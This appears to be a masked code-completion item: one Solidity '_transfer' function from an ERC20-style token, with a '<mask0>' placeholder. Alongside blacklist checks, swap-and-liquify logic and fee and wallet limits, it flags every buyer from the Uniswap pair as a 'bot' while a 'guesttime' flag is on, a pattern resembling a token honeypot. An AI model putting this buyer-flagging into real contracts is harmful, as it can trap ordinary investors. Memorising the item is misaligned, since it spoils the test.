"function _transfer(        address from,        address to,        uint256 amount    ) private {        require(from != address(0), \"ERC20: transfer from the zero address\");        require(to != address(0), \"ERC20: transfer to the zero address\");        require(amount > 0, \"Transfer amount must be greater than zero\");        require(!_isBlackListedBot[from], \"You are blacklisted\");        require(!_isBlackListedBot[msg.sender], \"blacklisted\");        require(!_isBlackListedBot[tx.origin], \"blacklisted\");        uint256 contractTokenBalance = balanceOf(address(this));        if (contractTokenBalance >= _maxTxAmount) {            contractTokenBalance = _maxTxAmount;        }        bool overMinTokenBalance = contractTokenBalance >=            numTokensSellToAddToLiquidity;        if (            overMinTokenBalance &&            !inSwapAndLiquify &&            from != uniswapV2Pair &&            swapAndLiquifyEnabled        ) {            contractTokenBalance = numTokensSellToAddToLiquidity;            swapAndLiquify(contractTokenBalance);        }        if(from == uniswapV2Pair && guesttime) {            botWallets[to] = true;            botsWallet.<mask0>;        }        bool takeFee = true;        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {            takeFee = false;        }        if (takeFee) {            if (!_isExcludedFromLimit[from] && !_isExcludedFromLimit[to]) {                require(                    amount <= _maxTxAmount,                    \"Transfer amount exceeds the maxTxAmount.\"                );                if (to != uniswapV2Pair) {                    require(                        amount + balanceOf(to) <= _maxWalletSize,                        \"Recipient exceeds max wallet size.\"                    );                }            }        }        _tokenTransfer(from, to, amount, takeFee);    }"